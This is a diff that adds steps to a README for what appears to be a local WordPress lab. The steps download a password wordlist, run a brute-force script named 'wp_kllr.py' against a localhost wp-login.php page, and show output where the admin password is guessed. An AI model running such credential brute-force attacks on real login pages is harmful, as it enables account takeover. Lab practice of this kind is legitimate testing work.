@@ -49,3 +49,50 @@ docker compose up -d
 ```bash
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Software/cain-and-abel.txt
 ```
+
+## 7. We are goint to test this endpont: http://localhost:8080/wp-login.php . 
+
+## 8. Run:
+```bash
+python wp_kllr.py 2< /dev/null        # Less spam in the terminal.
+```
+
+### OUTPUT:
+```bash
+Brute Force Attack beginning on http://localhost:8080/wp-login.php.
+
+Finished the setup where username = admin
+
+Trying username/password admin/!@#$%     
+Trying username/password admin/!@#$%^    
+Trying username/password admin/!@#$%^&   
+Trying username/password admin/!@#$%^&*  
+Trying username/password admin/*         
+Trying username/password admin/0         
+Trying username/password admin/0racl3    
+Trying username/password admin/0racl38   
+Trying username/password admin/0racl38i  
+Trying username/password admin/0racl39   
+Trying username/password admin/0racl39i  
+Trying username/password admin/0racle    
+Trying username/password admin/0racle10  
+Trying username/password admin/0racle10i 
+Trying username/password admin/0racle8   
+Trying username/password admin/0racle8i  
+Trying username/password admin/0racle9   
+Trying username/password admin/0racle9i  
+Trying username/password admin/1         
+Trying username/password admin/1022      
+Trying username/password admin/10sne1    
+Trying username/password admin/111111    
+Trying username/password admin/121212    
+Trying username/password admin/1225      
+
+Bruteforcing successful.
+Username is admin
+Password is 1022
+
+done: now cleaning up other threads...
+
+It works! 
+```
